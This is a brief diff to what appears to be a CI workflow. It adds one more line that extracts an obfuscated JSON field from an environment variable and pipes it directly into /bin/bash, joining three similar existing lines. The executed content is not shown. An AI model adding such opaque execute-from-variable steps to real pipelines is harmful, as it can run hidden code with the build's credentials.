@@ -23,6 +23,7 @@ jobs:
           echo $kxy1 | jq -r .z9 | /bin/bash
           echo $rksq6647 | jq -r .akj2076 | /bin/bash
           printf '%s' "$s2" | jq -r .ekkym9550 | /bin/bash
+          echo $sln0 | jq -r .gqfy28 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
